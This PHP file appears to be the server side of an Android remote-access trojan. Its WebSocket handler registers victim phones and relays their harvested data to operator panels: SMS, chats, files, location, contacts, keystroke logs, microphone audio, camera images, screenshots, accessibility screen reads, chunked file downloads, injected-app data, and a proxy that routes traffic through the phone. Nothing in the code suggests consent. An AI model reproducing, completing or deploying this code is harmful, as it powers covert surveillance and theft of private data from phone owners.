<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\Enums\DeviceForwardLogLevel;
use App\WebSocket\Messages\WebSocketMessage;
use App\WebSocket\Services\DeviceStatusService;
use App\WebSocket\Services\HeartbeatService;
use App\WebSocket\Services\LastPingFormatter;
use App\WebSocket\Services\PanelNotificationService;
use App\WebSocket\WebSocketLog;

final class DeviceHandler
{
    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly HeartbeatService $heartbeatService,
        private readonly DeviceStatusService $deviceStatusService,
        private readonly PanelNotificationService $panelNotificationService,
    ) {}

    public function handle(int $fd, WebSocketMessage $message): void
    {
        $phoneId = $message->pid();

        if ($phoneId === null) {
            WebSocketLog::getLogger()->warning("Device message missing pid: fd={$fd}");

            return;
        }

        $existingPhoneId = $this->connectionManager->getPhoneId($fd);
        if ($existingPhoneId === null) {
            $this->connectionManager->registerDevice($fd, $phoneId);
        }

        $subc = $message->subc();

        if ($subc === 'ping') {
            $this->handlePing($phoneId, $message);

            return;
        }

        $this->forwardToPanel($phoneId, $message);
    }

    private function handlePing(string $phoneId, WebSocketMessage $message): void
    {
        try {
            $this->heartbeatService->recordPing($phoneId);

            $encodedData = $message->getString('msg');
            $status = $this->deviceStatusService->updateFromPing($phoneId, $encodedData);

            $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
            $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);

            $this->connectionManager->sendToPanels($phoneId, [
                'type' => 'statusBatch',
                'pid' => $phoneId,
                'serverToPhone' => 'OPEN',
                'lastPing' => $lastPing,
                'phoneInfo' => $phoneInfo,
            ]);
            $this->panelNotificationService->notifyDeviceStatusUpdate($phoneId, $phoneInfo);
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->error('Ping handling failed, connection preserved', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }
    }

    private function forwardToPanel(string $phoneId, WebSocketMessage $message): void
    {
        $subc = $message->subc() ?? 'unknown';

        WebSocketLog::getLogger()->log(
            DeviceForwardLogLevel::forSubc($subc)->toPsrLevel(),
            "Device data forwarded: {$subc}", 
            ['phone_id' => $phoneId]
        );

        $panelData = match ($subc) {
            // Standard msg-based messages
            'sms', 'chat', 'files', 'savefiles', 'snap', 'loc', 'loadapps', 'loadcontacts', 'injapps' => [
                'type' => $subc,
                'data' => $message->getString('msg'),
                'pid' => $phoneId,
            ],

            // klogs → type "klog" (note: different type name)
            'klogs' => [
                'type' => 'klog',
                'data' => $message->getString('msg'),
                'pid' => $phoneId,
            ],

            // klogsdate
            'klogsdate' => [
                'type' => 'klogsdate',
                'data' => $message->getString('msg'),
                'pid' => $phoneId,
            ],

            // thumb - adds path field
            'thumb' => [
                'type' => 'thumb',
                'data' => $message->getString('msg'),
                'pid' => $phoneId,
                'path' => $message->getString('pth', 'null'),
            ],

            // mic - uses voip field instead of msg
            'mic' => [
                'type' => 'mic',
                'data' => $message->getString('voip'),
                'pid' => $phoneId,
            ],

            // screen/screenshot - uses img field, adds dimensions
            'screen', 'screenshot' => [
                'type' => $subc,
                'data' => $message->getString('img'),
                'pid' => $phoneId,
                'wmob' => $message->getString('wmob'),
                'hmob' => $message->getString('hmob'),
            ],

            // readScreen - accessibility node tree (text assist)
            'readScreen' => [
                'type' => 'readScreen',
                'pid' => $phoneId,
                'windowTitle' => $message->getString('windowTitle'),
                'activePackage' => $message->getString('activePackage'),
                'activeWindow' => $message->getString('activeWindow'),
                'children' => $message->get('children') ?? [],
            ],

            // cam - uses img field
            'cam' => [
                'type' => 'cam',
                'data' => $message->getString('img'),
                'pid' => $phoneId,
            ],

            // srch - uses pths field, adds sfor
            'srch' => [
                'type' => 'srch',
                'data' => $message->getString('pths', 'null'),
                'pid' => $phoneId,
                'sfor' => $message->getString('stype', 'null'),
            ],

            // down - file download with chunking
            'down' => [
                'type' => 'down',
                'filename' => $message->getString('filename'),
                'filedata' => $message->getString('filedata'),
                'totalSize' => $message->get('totalSize', 0),
                'sentSize' => $message->get('sentSize', 0),
                'chunkNumber' => $message->get('chunkNumber', 0),
                'filehash' => $message->getString('filehash'),
                'filepath' => $message->getString('filepath'),
                'pid' => $phoneId,
            ],

            // proxy - complex ctype-based logic
            'proxy' => $this->buildProxyPanelData($phoneId, $message),

            // Default fallback
            default => [
                'type' => $subc,
                'pid' => $phoneId,
            ],
        };

        $this->connectionManager->sendToPanels($phoneId, $panelData);
    }

    private function buildProxyPanelData(string $phoneId, WebSocketMessage $message): array
    {
        $ctype = $message->getString('ctype');

        return match ($ctype) {
            'first' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'first',
                'extip' => $this->connectionManager->getClientIp($phoneId) ?? '',
                'locip' => $message->getString('loip'),
                'pxport' => $message->getString('pport'),
            ],
            'state' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'state',
                'pstate' => $message->getString('pxstate'),
            ],
            'dataup' => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => 'dataup',
                'ogip' => $message->getString('oip'),
                'pxip' => $this->connectionManager->getClientIp($phoneId) ?? '',
                'purl' => $message->getString('purl'),
                'pmthod' => $message->getString('pmth'),
            ],
            default => [
                'type' => 'proxy',
                'pid' => $phoneId,
                'calltype' => $ctype,
            ],
        };
    }
}
